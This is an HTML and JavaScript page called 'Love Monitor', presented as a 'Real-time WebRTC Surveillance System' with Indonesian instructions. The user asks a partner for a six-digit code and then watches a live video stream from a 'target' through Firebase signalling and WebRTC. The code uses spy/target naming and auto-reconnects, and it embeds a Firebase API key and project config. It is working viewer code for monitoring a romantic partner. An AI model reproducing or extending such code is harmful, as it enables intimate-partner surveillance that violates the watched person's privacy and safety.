<!DOCTYPE html>
<html>
<head>
    <title>🔍 Love Monitor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; }
        .title { color: #f0f; font-size: 2em; text-shadow: 0 0 10px #f0f; }
        
        .connection-panel {
            background: #111;
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        
        .input-group {
            margin: 20px 0;
            text-align: center;
        }
        
        input {
            background: #222;
            color: #0f0;
            border: 2px solid #444;
            padding: 15px;
            width: 100%;
            max-width: 400px;
            border-radius: 8px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 3px;
            font-family: monospace;
            text-transform: uppercase;
        }
        
        input:focus {
            outline: none;
            border-color: #f0f;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        button {
            background: linear-gradient(45deg, #f0f, #0ff);
            color: black;
            border: none;
            padding: 15px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            min-width: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        #connectBtn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
        }
        
        #disconnectBtn {
            background: linear-gradient(45deg, #f44336, #d32f2f);
        }
        
        .status-display {
            background: #222;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
            border-left: 4px solid #f0f;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .connected {
            border-left-color: #4CAF50;
            background: #1a2b1a;
        }
        
        .disconnected {
            border-left-color: #f44336;
            background: #2b1a1a;
        }
        
        #videoContainer {
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
            border: 3px solid #f0f;
            min-height: 400px;
            position: relative;
        }
        
        #remoteVideo {
            width: 100%;
            display: block;
        }
        
        .video-placeholder {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #666;
            text-align: center;
            font-size: 18px;
        }
        
        .log {
            background: #111;
            padding: 15px;
            border-radius: 5px;
            height: 200px;
            overflow-y: auto;
            margin-top: 20px;
            border: 1px solid #333;
        }
        
        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid #222;
            font-size: 14px;
        }
        
        .log-time {
            color: #0ff;
            font-size: 12px;
        }
        
        .instructions {
            background: #1a1a2e;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #0ff;
        }
        
        .instructions ol {
            margin-left: 20px;
            margin-top: 10px;
        }
        
        .instructions li {
            margin: 8px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">💘 LOVE MONITOR</h1>
            <p>Real-time WebRTC Surveillance System</p>
        </div>
        
        <div class="instructions">
            <strong>📋 CARA PAKAI:</strong>
            <ol>
                <li>Minta <strong>KODE 6 DIGIT</strong> dari pacarmu</li>
                <li>Masukkan kode di bawah</li>
                <li>Klik <strong>CONNECT</strong></li>
                <li>Tunggu hingga terhubung</li>
            </ol>
        </div>
        
        <div class="connection-panel">
            <div class="input-group">
                <input type="text" 
                       id="roomInput" 
                       placeholder="MASUKKAN KODE 6 DIGIT" 
                       maxlength="6"
                       oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '')">
            </div>
            
            <div class="button-group">
                <button onclick="connectToRoom()" id="connectBtn">
                    🔗 CONNECT
                </button>
                <button onclick="disconnect()" id="disconnectBtn" disabled>
                    ✖️ DISCONNECT
                </button>
            </div>
            
            <div class="status-display disconnected" id="statusDisplay">
                🔴 MENUNGGU KODE ROOM
            </div>
        </div>
        
        <div id="videoContainer">
            <div class="video-placeholder" id="videoPlaceholder">
                🎥 Video akan muncul di sini setelah terhubung
            </div>
            <video id="remoteVideo" autoplay playsinline></video>
        </div>
        
        <div class="log" id="log">
            <div class="log-entry">
                <span class="log-time">[System]</span> Monitor siap menerima koneksi
            </div>
        </div>
    </div>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <script>
        // ========== CONFIG ==========
        const firebaseConfig = {
            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
            authDomain: "survei-f11a1.firebaseapp.com",
            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-f11a1",
            storageBucket: "survei-f11a1.firebasestorage.app",
            messagingSenderId: "769641850914",
            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // ========== VARIABLES ==========
        let peerConnection;
        let roomId;
        let answerListener;
        let candidateListener;
        
        // ========== GET ROOM ID FROM INPUT ==========
        function getRoomId() {
            return document.getElementById('roomInput').value.trim().toUpperCase();
        }
        
        // ========== CONNECT TO ROOM ==========
        async function connectToRoom() {
            roomId = getRoomId();
            
            if (!roomId || roomId.length !== 6) {
                log("❌ Masukkan kode 6 digit yang valid!");
                return;
            }
            
            const connectBtn = document.getElementById('connectBtn');
            const disconnectBtn = document.getElementById('disconnectBtn');
            const statusDisplay = document.getElementById('statusDisplay');
            
            connectBtn.disabled = true;
            disconnectBtn.disabled = false;
            connectBtn.innerHTML = "🔄 CONNECTING...";
            
            statusDisplay.className = "status-display disconnected";
            statusDisplay.innerHTML = "🔄 Mencari room...";
            
            log(`🔍 Mencari room: ${roomId}`);
            
            try {
                // Check if room exists
                const snapshot = await database.ref('rooms/' + roomId).once('value');
                if (!snapshot.exists() || !snapshot.val().active) {
                    throw new Error("Room tidak ditemukan atau tidak aktif!");
                }
                
                log("✅ Room ditemukan! Membuat koneksi WebRTC...");
                
                // Setup WebRTC
                await setupWebRTC();
                
                // Create and send offer
                const offer = await peerConnection.createOffer({
                    offerToReceiveVideo: true,
                    offerToReceiveAudio: false
                });
                
                await peerConnection.setLocalDescription(offer);
                
                // Clean old offer first
                await database.ref(`rooms/${roomId}/offer`).remove();
                
                // Send offer to target
                await database.ref(`rooms/${roomId}/offer`).set(offer);
                log("📤 Offer terkirim ke target");
                
                // Setup listeners
                setupListeners();
                
                // Update UI
                statusDisplay.className = "status-display disconnected";
                statusDisplay.innerHTML = "🟡 MENUNGGU RESPONSE TARGET...";
                
            } catch (error) {
                log(`❌ Error: ${error.message}`);
                
                connectBtn.disabled = false;
                disconnectBtn.disabled = true;
                connectBtn.innerHTML = "🔗 CONNECT";
                
                statusDisplay.className = "status-display disconnected";
                statusDisplay.innerHTML = `🔴 ${error.message}`;
                
                // Auto-retry in 5 seconds
                setTimeout(() => {
                    if (!peerConnection || peerConnection.connectionState !== 'connected') {
                        log("🔄 Mencoba kembali...");
                        connectToRoom();
                    }
                }, 5000);
            }
        }
        
        // ========== WEBRTC SETUP ==========
        function setupWebRTC() {
            peerConnection = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            // Handle incoming stream
            peerConnection.ontrack = (event) => {
                log("🎥 Stream video diterima!");
                
                const video = document.getElementById('remoteVideo');
                const placeholder = document.getElementById('videoPlaceholder');
                
                video.srcObject = event.streams[0];
                placeholder.style.display = 'none';
                video.style.display = 'block';
                
                document.getElementById('statusDisplay').className = "status-display connected";
                document.getElementById('statusDisplay').innerHTML = "🟢 LIVE - TERHUBUNG!";
                
                log("✅ Koneksi WebRTC berhasil!");
            };
            
            // ICE candidate handler
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    database.ref(`rooms/${roomId}/spyCandidates`).push(event.candidate.toJSON());
                }
            };
            
            // Connection state
            peerConnection.onconnectionstatechange = () => {
                const state = peerConnection.connectionState;
                log(`Status koneksi: ${state}`);
                
                if (state === 'connected') {
                    document.getElementById('statusDisplay').innerHTML = "🔴 LIVE - STREAM AKTIF";
                } else if (state === 'disconnected' || state === 'failed' || state === 'closed') {
                    handleDisconnection();
                }
            };
        }
        
        // ========== SETUP LISTENERS ==========
        function setupListeners() {
            // Listen for answer from target
            answerListener = database.ref(`rooms/${roomId}/answer`).on('value', async (snapshot) => {
                const answer = snapshot.val();
                if (answer && peerConnection.signalingState === 'have-local-offer') {
                    log("📥 Answer diterima dari target");
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                }
            });
            
            // Listen for target ICE candidates
            candidateListener = database.ref(`rooms/${roomId}/targetCandidates`).on('child_added', async (snapshot) => {
                const candidate = snapshot.val();
                if (candidate) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                        log("✅ ICE candidate ditambahkan");
                    } catch (e) {
                        log(`⚠️ ICE error: ${e.message}`);
                    }
                }
            });
        }
        
        // ========== DISCONNECT ==========
        function disconnect() {
            cleanup();
            
            document.getElementById('connectBtn').disabled = false;
            document.getElementById('disconnectBtn').disabled = true;
            document.getElementById('connectBtn').innerHTML = "🔗 CONNECT";
            
            document.getElementById('statusDisplay').className = "status-display disconnected";
            document.getElementById('statusDisplay').innerHTML = "🔴 TERPUTUS";
            
            const video = document.getElementById('remoteVideo');
            const placeholder = document.getElementById('videoPlaceholder');
            
            video.style.display = 'none';
            placeholder.style.display = 'block';
            
            log("✖️ Koneksi diputus");
        }
        
        // ========== HANDLE DISCONNECTION ==========
        function handleDisconnection() {
            log("⚠️ Koneksi terputus!");
            
            document.getElementById('statusDisplay').className = "status-display disconnected";
            document.getElementById('statusDisplay').innerHTML = "🔄 MENCARI ULANG...";
            
            // Auto-reconnect
            setTimeout(() => {
                if (roomId && (!peerConnection || peerConnection.connectionState !== 'connected')) {
                    log("🔄 Mencoba reconnect...");
                    connectToRoom();
                }
            }, 3000);
        }
        
        // ========== CLEANUP ==========
        function cleanup() {
            // Remove Firebase listeners
            if (answerListener) database.ref(`rooms/${roomId}/answer`).off('value', answerListener);
            if (candidateListener) database.ref(`rooms/${roomId}/targetCandidates`).off('child_added', candidateListener);
            
            // Close WebRTC connection
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            
            // Clear video stream
            const video = document.getElementById('remoteVideo');
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
        }
        
        // ========== LOG UTILITY ==========
        function log(message) {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = "log-entry";
            
            const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
            entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
            
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // ========== AUTO-CONNECT FROM URL ==========
        function checkURLForRoom() {
            const urlParams = new URLSearchParams(window.location.search);
            const roomFromURL = urlParams.get('room');
            
            if (roomFromURL && roomFromURL.length === 6) {
                document.getElementById('roomInput').value = roomFromURL.toUpperCase();
                log(`📥 Room ID dari URL: ${roomFromURL}`);
                
                // Auto-connect after 1 second
                setTimeout(() => {
                    connectToRoom();
                }, 1000);
            }
        }
        
        // ========== INITIALIZATION ==========
        window.onload = function() {
            log("🟢 Sistem monitor siap");
            
            // Check for room ID in URL
            checkURLForRoom();
            
            // Auto-focus input
            document.getElementById('roomInput').focus();
            
            // Enable Enter key to connect
            document.getElementById('roomInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    connectToRoom();
                }
            });
        };
        
        // Cleanup on page unload
        window.addEventListener('beforeunload', cleanup);
        window.addEventListener('pagehide', cleanup);
    </script>
</body>
    </html>
